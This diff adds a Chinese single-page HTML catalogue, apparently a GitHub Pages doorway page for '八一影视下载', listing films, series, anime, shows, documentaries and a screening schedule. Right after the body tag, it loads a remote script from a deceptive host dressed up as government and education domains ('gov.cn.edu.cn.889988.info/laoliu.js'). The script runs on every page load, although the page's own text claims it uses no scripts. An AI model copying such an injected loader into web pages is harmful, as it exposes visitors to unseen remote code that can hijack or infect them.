@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>八一影视下载 - 影视片单索引与查阅目录</title>
+<meta name="description" content="八一影视下载（bayiyingshixiazai-h5）是影视片单索引单页，提供电影、剧集、动漫、综艺、纪录片、短剧六大频道的查阅目录与放映场次，移动端自适应。" />
+<meta name="keywords" content="八一影视下载, 八一影视, 影视片单, 片单索引, bayiyingshixiazai-h5" />
+<link rel="canonical" href="https://bayiyingshixiazai-h5.github.io/" />
+<style>
+    :root{
+        --khaki:#6b6b4f;
+        --olive:#4a5d3a;
+        --olive-deep:#364528;
+        --seal:#a32b24;
+        --paper:#f1ead6;
+        --paper-2:#e7ddc4;
+        --ink:#2b2a22;
+        --muted:#6d6a58;
+        --line:#cdc3a5;
+    }
+    *{margin:0;padding:0;box-sizing:border-box;}
+    html{scroll-behavior:smooth;}
+    body{
+        background:var(--paper);
+        color:var(--ink);
+        font-family:"PingFang SC","Microsoft YaHei",Arial,serif;
+        line-height:1.75;
+        -webkit-text-size-adjust:100%;
+        background-image:
+            repeating-linear-gradient(0deg,rgba(107,107,79,.05) 0 1px,transparent 1px 24px),
+            repeating-linear-gradient(90deg,rgba(107,107,79,.05) 0 1px,transparent 1px 24px);
+    }
+    a{color:var(--olive-deep);text-decoration:none;}
+
+    /* 档案封套 */
+    .dossier{
+        position:relative;
+        margin:18px 14px 0;
+        background:linear-gradient(180deg,var(--paper-2),var(--paper));
+        border:2px solid var(--khaki);
+        border-radius:4px;
+        padding:30px 18px 26px;
+        text-align:center;
+    }
+    .dossier::before{
+        content:"";position:absolute;left:14px;right:14px;top:8px;height:1px;
+        background:repeating-linear-gradient(90deg,var(--khaki) 0 6px,transparent 6px 10px);
+    }
+    .seal{
+        display:inline-block;
+        border:3px double var(--seal);
+        color:var(--seal);
+        font-size:12px;
+        letter-spacing:3px;
+        padding:4px 12px;
+        border-radius:4px;
+        transform:rotate(-4deg);
+        margin-bottom:14px;
+    }
+    .dossier h1{
+        font-size:30px;
+        letter-spacing:6px;
+        color:var(--olive-deep);
+        font-weight:800;
+    }
+    .dossier .cat-no{
+        margin-top:6px;font-size:12px;color:var(--khaki);letter-spacing:2px;
+    }
+    .dossier .url{margin-top:6px;font-size:12px;color:var(--muted);}
+
+    .wrap{
+        max-width:1100px;margin:auto;padding:18px 14px 40px;
+        display:grid;grid-template-columns:176px 1fr 236px;gap:16px;align-items:start;
+    }
+
+    /* 目录卡 */
+    .cardcat{
+        position:sticky;top:14px;
+        background:var(--paper-2);
+        border:1px solid var(--line);
+        border-radius:4px;padding:12px;
+    }
+    .cardcat .lab{
+        font-size:11px;color:var(--olive-deep);letter-spacing:2px;
+        padding-bottom:8px;margin-bottom:8px;border-bottom:1px dashed var(--khaki);
+    }
+    .cardcat a{
+        display:block;padding:8px 10px;font-size:13px;color:var(--ink);
+        border-left:3px solid transparent;
+    }
+    .cardcat a:hover{background:#e3d8ba;border-left-color:var(--seal);color:var(--seal);}
+
+    /* 档案袋区块 */
+    .folder{
+        background:#fbf6e8;
+        border:1px solid var(--line);
+        border-left:5px solid var(--olive);
+        border-radius:4px;
+        padding:16px 18px;
+        margin-bottom:16px;
+        scroll-margin-top:14px;
+    }
+    .folder-head{
+        display:flex;align-items:baseline;gap:10px;
+        padding-bottom:8px;margin-bottom:14px;border-bottom:1px dashed var(--khaki);
+    }
+    .folder-head .call{
+        font-size:11px;color:#fbf6e8;background:var(--olive);
+        border-radius:3px;padding:1px 7px;font-weight:700;letter-spacing:1px;
+    }
+    .folder-head h2{font-size:18px;color:var(--olive-deep);}
+    .folder-head .more{margin-left:auto;font-size:12px;color:var(--muted);}
+
+    /* 卡片：档案卡样式 */
+    .cards{
+        display:grid;
+        grid-template-columns:repeat(auto-fill,minmax(152px,1fr));
+        gap:12px;
+    }
+    .fcard{
+        background:var(--paper);
+        border:1px solid var(--line);
+        border-radius:3px;
+        padding:12px 12px 14px;
+        min-height:112px;
+        position:relative;
+    }
+    .fcard::after{
+        content:"";position:absolute;right:0;bottom:0;
+        width:0;height:0;
+        border-style:solid;border-width:0 0 14px 14px;
+        border-color:transparent transparent var(--paper-2) transparent;
+    }
+    .fcard:nth-child(2){transform:rotate(1.2deg);}
+    .fcard:nth-child(5){transform:rotate(-1deg);}
+    .fcard .tag{
+        display:inline-block;font-size:11px;color:var(--seal);
+        border:1px solid var(--seal);border-radius:2px;padding:0 6px;margin-bottom:8px;
+    }
+    .fcard b{display:block;font-size:15px;color:var(--ink);}
+    .fcard p{font-size:12px;color:var(--muted);margin-top:4px;}
+
+    /* 侧栏 */
+    .side{position:sticky;top:14px;}
+    .pocket{
+        background:var(--paper-2);border:1px solid var(--line);
+        border-radius:4px;padding:14px;margin-bottom:14px;
+    }
+    .pocket h3{
+        font-size:13px;color:var(--olive-deep);letter-spacing:1px;
+        padding-bottom:6px;margin-bottom:10px;border-bottom:1px dashed var(--khaki);
+    }
+    .ledger{list-style:none;}
+    .ledger li{
+        display:flex;gap:8px;font-size:13px;padding:6px 0;
+        border-bottom:1px dotted var(--line);
+    }
+    .ledger li:last-child{border-bottom:none;}
+    .ledger .k{color:var(--seal);font-weight:700;width:56px;flex:none;font-size:12px;}
+    .ledger .v{color:var(--ink);}
+    .ledger .v small{display:block;color:var(--muted);font-size:11px;}
+
+    .stamp{
+        border:2px dashed var(--seal);color:var(--seal);
+        text-align:center;padding:12px;border-radius:4px;
+    }
+    .stamp b{font-size:14px;letter-spacing:2px;display:block;}
+    .stamp span{font-size:11px;}
+
+    footer{
+        text-align:center;padding:20px 14px;
+        font-size:12px;color:var(--muted);
+        background:var(--paper-2);border-top:1px solid var(--line);
+    }
+
+    @media (max-width:900px){
+        .wrap{grid-template-columns:1fr;}
+        .cardcat,.side{position:static;}
+        .cardcat{display:flex;flex-wrap:wrap;}
+        .cardcat .lab{width:100%;}
+        .cardcat a{flex:1 1 auto;text-align:center;border-left:none;border-bottom:3px solid transparent;}
+        .cardcat a:hover{border-left:none;border-bottom-color:var(--seal);}
+        .side{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+        .dossier h1{font-size:24px;letter-spacing:3px;}
+        .fcard:nth-child(n){transform:none;}
+    }
+    @media (max-width:520px){
+        .side{grid-template-columns:1fr;}
+    }
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="dossier">
+    <div class="seal">阅 档 备 案</div>
+    <h1>八一影视下载</h1>
+    <div class="cat-no">档号：BAYI-YINGSHI · 片单查阅目录</div>
+    <div class="url">https://bayiyingshixiazai-h5.github.io</div>
+</header>
+
+<div class="wrap">
+
+    <!-- 目录卡 -->
+    <nav class="cardcat" aria-label="频道目录">
+        <div class="lab">卷内目录</div>
+        <a href="#film">01 电影卷</a>
+        <a href="#tv">02 剧集卷</a>
+        <a href="#anime">03 动漫卷</a>
+        <a href="#show">04 综艺卷</a>
+        <a href="#doc">05 纪录卷</a>
+        <a href="#short">06 短剧卷</a>
+        <a href="#showing">07 今日放映</a>
+        <a href="#about">08 库房说明</a>
+    </nav>
+
+    <!-- 档案主区 -->
+    <main>
+
+        <section class="folder" id="film">
+            <div class="folder-head">
+                <span class="call">卷 01</span><h2>电影卷</h2>
+                <a class="more" href="#">调阅目录 #</a>
+            </div>
+            <div class="cards">
+                <article class="fcard"><span class="tag">动作</span><b>极夜追光</b><p>4K · 128 分钟 · 片单编号 F-001</p></article>
+                <article class="fcard"><span class="tag">剧情</span><b>城南旧信</b><p>修复版 · 96 分钟 · F-002</p></article>
+                <article class="fcard"><span class="tag">科幻</span><b>深空回响</b><p>杜比 · 141 分钟 · F-003</p></article>
+                <article class="fcard"><span class="tag">喜剧</span><b>好运降落</b><p>1080P · 103 分钟 · F-004</p></article>
+            </div>
+        </section>
+
+        <section class="folder" id="tv">
+            <div class="folder-head">
+                <span class="call">卷 02</span><h2>剧集卷</h2>
+                <a class="more" href="#">调阅目录 #</a>
+            </div>
+            <div class="cards">
+                <article class="fcard"><span class="tag">更新中</span><b>长风渡口</b><p>古装 · 第 24 集 · T-001</p></article>
+                <article class="fcard"><span class="tag">完结</span><b>城市微光</b><p>都市 · 32 集全 · T-002</p></article>
+                <article class="fcard"><span class="tag">更新中</span><b>沉默星轨</b><p>悬疑 · 第 12 集 · T-003</p></article>
+                <article class="fcard"><span class="tag">独家</span><b>烽火家书</b><p>年代 · 第 8 集 · T-004</p></article>
+            </div>
+        </section>
+
+        <section class="folder" id="anime">
+            <div class="folder-head">
+                <span class="call">卷 03</span><h2>动漫卷</h2>
+                <a class="more" href="#">调阅目录 #</a>
+            </div>
+            <div class="cards">
+                <article class="fcard"><span class="tag">国漫</span><b>山海星镜</b><p>奇幻 · EP18 · A-001</p></article>
+                <article class="fcard"><span class="tag">治愈</span><b>云边小站</b><p>日常 · 全 12 话 · A-002</p></article>
+                <article class="fcard"><span class="tag">热血</span><b>破晓之刃</b><p>战斗 · EP21 · A-003</p></article>
+                <article class="fcard"><span class="tag">剧场版</span><b>星尘列车</b><p>1080P · 96 分钟 · A-004</p></article>
+            </div>
+        </section>
+
+        <section class="folder" id="show">
+            <div class="folder-head">
+                <span class="call">卷 04</span><h2>综艺卷</h2>
+                <a class="more" href="#">调阅目录 #</a>
+            </div>
+            <div class="cards">
+                <article class="fcard"><span class="tag">真人秀</span><b>出发吧周末</b><p>户外 · EP09 · S-001</p></article>
+                <article class="fcard"><span class="tag">访谈</span><b>深夜放映室</b><p>每周五 · S-002</p></article>
+                <article class="fcard"><span class="tag">喜剧</span><b>笑点回收站</b><p>全 10 期 · S-003</p></article>
+                <article class="fcard"><span class="tag">美食</span><b>舌尖上的路</b><p>旅行 · EP06 · S-004</p></article>
+            </div>
+        </section>
+
+        <section class="folder" id="doc">
+            <div class="folder-head">
+                <span class="call">卷 05</span><h2>纪录卷</h2>
+                <a class="more" href="#">调阅目录 #</a>
+            </div>
+            <div class="cards">
+                <article class="fcard"><span class="tag">自然</span><b>山河纪行</b><p>4K · 6 集 · D-001</p></article>
+                <article class="fcard"><span class="tag">历史</span><b>古城密码</b><p>1080P · 4 集 · D-002</p></article>
+                <article class="fcard"><span class="tag">人文</span><b>手艺人</b><p>全 8 集 · D-003</p></article>
+                <article class="fcard"><span class="tag">科技</span><b>未来简史</b><p>更新中 · EP03 · D-004</p></article>
+            </div>
+        </section>
+
+        <section class="folder" id="short">
+            <div class="folder-head">
+                <span class="call">卷 06</span><h2>短剧卷</h2>
+                <a class="more" href="#">调阅目录 #</a>
+            </div>
+            <div class="cards">
+                <article class="fcard"><span class="tag">剧情</span><b>重回巅峰</b><p>连续剧集 · 80 章 · X-001</p></article>
+                <article class="fcard"><span class="tag">情感</span><b>恰逢心动</b><p>连续剧集 · 60 章 · X-002</p></article>
+                <article class="fcard"><span class="tag">励志</span><b>这一局我赢</b><p>连续剧集 · 100 章 · X-003</p></article>
+                <article class="fcard"><span class="tag">悬疑</span><b>第13通电话</b><p>连续剧集 · 30 章 · X-004</p></article>
+            </div>
+        </section>
+
+        <section class="folder" id="showing">
+            <div class="folder-head">
+                <span class="call">场次</span><h2>今日放映</h2>
+                <a class="more" href="#">整周场次 #</a>
+            </div>
+            <ul class="ledger">
+                <li><span class="k">20:00</span><span class="v">极夜追光<small>电影卷 · 4K 首映场 · F-001</small></span></li>
+                <li><span class="k">21:10</span><span class="v">长风渡口 第24集<small>剧集卷 · 同步更新 · T-001</small></span></li>
+                <li><span class="k">22:00</span><span class="v">山海星镜 EP18<small>动漫卷 · 周更放送 · A-001</small></span></li>
+                <li><span class="k">23:30</span><span class="v">山河纪行 第1集<small>纪录卷 · 4K 自然影像 · D-001</small></span></li>
+            </ul>
+        </section>
+
+        <section class="folder" id="about">
+            <div class="folder-head">
+                <span class="call">说明</span><h2>库房说明</h2>
+            </div>
+            <p style="font-size:14px;margin-bottom:8px;">
+                <b style="color:var(--olive-deep);">八一影视下载</b>（bayiyingshixiazai-h5）是一个以「档案库房」方式组织的影视片单查阅页，
+                把电影、剧集、动漫、综艺、纪录片、短剧分卷编目，并附一张每日放映场次表，方便访客快速定位想看的内容。
+            </p>
+            <p style="font-size:14px;margin-bottom:8px;">
+                本页为纯静态单文件，全部文字直接写在 HTML 中、不依赖脚本渲染，三栏布局在手机端自动折为单栏，
+                便于搜索引擎读取标题层级与卷内目录。
+            </p>
+            <p style="font-size:14px;">
+                官方地址：https://bayiyingshixiazai-h5.github.io<br />
+                频道入口以锚点（#）组织，适合作为 GitHub Pages 上的品牌入口页与片单索引页。
+            </p>
+        </section>
+
+    </main>
+
+    <!-- 侧栏 -->
+    <aside class="side">
+        <div class="pocket">
+            <h3>调阅登记</h3>
+            <ul class="ledger">
+                <li><span class="k">在库</span><span class="v">六卷 · 24 条目</span></li>
+                <li><span class="k">格式</span><span class="v">1080P / 4K / 杜比标注</span></li>
+                <li><span class="k">更新</span><span class="v">每日同步放映场次</span></li>
+                <li><span class="k">终端</span><span class="v">手机 · 平板 · 桌面</span></li>
+            </ul>
+        </div>
+
+        <div class="pocket">
+            <h3>本日新入档</h3>
+            <ul class="ledger">
+                <li><span class="k">F-001</span><span class="v">极夜追光<small>4K 源已核校</small></span></li>
+                <li><span class="k">T-001</span><span class="v">长风渡口<small>更新至 24 集</small></span></li>
+                <li><span class="k">A-001</span><span class="v">山海星镜<small>第 18 话入库</small></span></li>
+                <li><span class="k">D-001</span><span class="v">山河纪行<small>新增 4K 音轨</small></span></li>
+            </ul>
+        </div>
+
+        <div class="pocket stamp">
+            <b>仅 供 索 引</b>
+            <span>本页为片单目录，不提供资源文件存储与下载分发</span>
+        </div>
+    </aside>
+
+</div>
+
+<footer>
+    © 2026 八一影视下载 · bayiyingshixiazai-h5.github.io · 单页片单索引模板
+</footer>
+
+</body>
+</html>
